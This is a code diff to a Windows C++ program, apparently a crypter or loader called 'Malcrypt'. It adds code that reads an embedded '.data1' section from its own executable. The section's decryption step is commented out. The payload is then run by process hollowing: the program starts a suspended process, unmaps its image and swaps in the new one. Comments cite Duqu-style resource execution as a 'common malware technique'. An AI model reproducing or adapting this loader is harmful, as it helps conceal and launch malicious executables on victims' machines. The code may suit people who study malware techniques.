@@ -3,6 +3,8 @@
 
 #include "stdafx.h"
 
+#define SECTION_NAME ".data1"
+
 //extern "C" NTSYSAPI LONG NTAPI ZwUnmapViewOfSection(HANDLE, PVOID);
 /* http://stackoverflow.com/questions/15714492/creating-a-proccess-in-memory-c */
 typedef LONG(NTAPI *pfnZwUnmapViewOfSection)(HANDLE, PVOID);
@@ -17,13 +19,14 @@ ULONG protect(ULONG characteristics)
 }
 
 HRESULT
-ExecData(PVOID pvPEData)
+ExecData(PVOID &pvPEData)
 {
 	HRESULT hr = S_OK;
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si = { sizeof si };
 
-	CreateProcess(0, L"cmd", 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &si, &pi);
+	CreateProcess(0, NULL, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, 
+		&si, &pi);
 
 	CONTEXT context = { CONTEXT_INTEGER };
 	GetThreadContext(pi.hThread, &context);
@@ -73,41 +76,113 @@ ExecData(PVOID pvPEData)
 	return hr;
 }
 
+int 
+GetSectionData(
+	_TCHAR *moduleName, 
+	PUINT32 puSectionDataSize,
+	PBYTE *pbSectionData)
+{
+	int result = 0;
+	HANDLE hFile;
+	HANDLE hFileMapping = 0;
+	LPVOID lpFileBase = 0;
+
+	*puSectionDataSize = 0;
+	hFile = CreateFile(moduleName, GENERIC_READ, FILE_SHARE_READ, NULL,
+		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+	if (hFile == INVALID_HANDLE_VALUE) {
+		result = 1;
+		goto Cleanup;
+	}
+	hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+	if (hFileMapping == 0) {
+		result = 1;
+		goto Cleanup;
+	}
+	lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
+	if (lpFileBase == 0) {
+		result = 1;
+		goto Cleanup;
+	}
+
+	PIMAGE_DOS_HEADER pimdh;
+	PIMAGE_NT_HEADERS pimnth;
+	PIMAGE_SECTION_HEADER pimsh;
+	
+	pimdh = (PIMAGE_DOS_HEADER)lpFileBase;
+	pimnth = (PIMAGE_NT_HEADERS)((char *)lpFileBase + pimdh->e_lfanew);
+	pimsh = (PIMAGE_SECTION_HEADER)(pimnth + 1);
+
+	DWORD start = 0;
+	DWORD length = 0;
+
+	for (int i = 0; i<pimnth->FileHeader.NumberOfSections; i++) {
+		if (!strcmp((char *)pimsh->Name, SECTION_NAME)) {
+			start = pimsh->PointerToRawData + (DWORD)lpFileBase;
+			length = pimsh->SizeOfRawData;
+			break;
+		}
+		pimsh++;
+	}
+
+	AllocateAndZero((PVOID*) pbSectionData, length);
+	memcpy(*pbSectionData, (void *)start, length);
+	*puSectionDataSize = length;
+	
+Cleanup:
+	if (lpFileBase != 0) {
+		CloseHandle(hFileMapping);
+	}
+	if (hFileMapping != 0) {
+		CloseHandle(hFile);
+	}
+
+	return result;
+}
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	HRESULT status;
+	HRESULT status = S_OK;
 	PCWSTR keyName = L"MalcryptKey0";
 
-	/* Using the (now-static keyname), decrypt a PE section. */
-	// /SECTION:name,[[!]{!K!PR}][,ALIGN=#]
-
-	/* Rewrite this compiled binary to include a ".data1" section. */
-	HRSRC resInfo = FindResource(0, L".data1", L"EXE");
-	DWORD resInfoSize = SizeofResource(0, resInfo);
 	/* 
-	 * Improvement: Duqu-style execute of resources, common malware technique. 
+	 * Using the (now-static keyname), decrypt a PE section.
+	 * /SECTION:name,[[!]{!K!PR}][,ALIGN=#]
+	 * Improvement: Duqu-style execute of resources, common
+	 * malware technique. 
 	 * Read: http://blog.w4kfu.com/tag/duqu
 	 */
-	PVOID ogPEData = LockResource(LoadResource(0, resInfo));
+
+	UINT32 sectionDataSize;
+	PBYTE sectionData;
+	GetSectionData(argv[0], &sectionDataSize, &sectionData);
 
 	/* Now decrypt the resource. */
 	UINT32 decPEDataSize;
 	PVOID decPEData;
-	status = TlclDecrypt(
+	
+	/*status = TlclDecrypt(
 		keyName,
 		resInfoSize,
 		(PBYTE)ogPEData,
-		&decPEDataSize,
 		(PBYTE*) &decPEData,
-		NULL);
+		&decPEDataSize,
+		NULL);*/
+	decPEData = sectionData;
+	// = resInfoSize;
 
 	/* Execute the descrypted resource. */
 	ExecData(decPEData);
 
+	/* Free the allocated section. */
+	if (sectionDataSize > 0) {
+		ZeroAndFree((PVOID*)&sectionData, sectionDataSize);
+	}
+
 	/* Free the decrypted data? */
-	ZeroAndFree((PVOID*)&decPEData, decPEDataSize);
-	decPEDataSize = 0;
+	//ZeroAndFree((PVOID*)&decPEData, decPEDataSize);
+	//decPEDataSize = 0;
 
 	return status;
 }
